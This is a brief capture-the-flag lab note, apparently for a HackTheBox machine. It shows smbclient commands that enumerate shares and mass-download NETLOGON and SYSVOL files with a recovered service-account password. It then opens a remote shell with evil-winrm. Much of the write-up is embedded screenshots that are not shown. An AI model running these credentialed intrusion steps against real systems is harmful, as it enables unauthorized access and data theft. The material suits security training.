
```
smbclient -L 10.10.10.161 -U 'svc-alfresco'
s3rvice
```

![[Pasted image 20231114155917.png]]

As you can looks that now we can see the smb share.

We are not able to login in adim or c or even ipc as we don't have access to it
![[Pasted image 20231114160256.png]]


```
smbclient \\\\10.10.10.161\\NETLOGON -U 'svc-alfresco'
```

It seems like we got a directory in this share
```
smbclient \\\\10.10.10.161\\SYSVOL -U 'svc-alfresco'
```
![[Pasted image 20231114160429.png]]
So let's download it and see if we can do something with it


```
prompt off
recurse on
ls
mget *
```

We are not able to download one file and got the hands on rest of the files 
![[Pasted image 20231114161502.png]]

![[Pasted image 20231114161842.png]]


![[Pasted image 20231114162018.png]]

Got the low level access
```
evil-winrm  -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
```
![[Pasted image 20231114162247.png]]

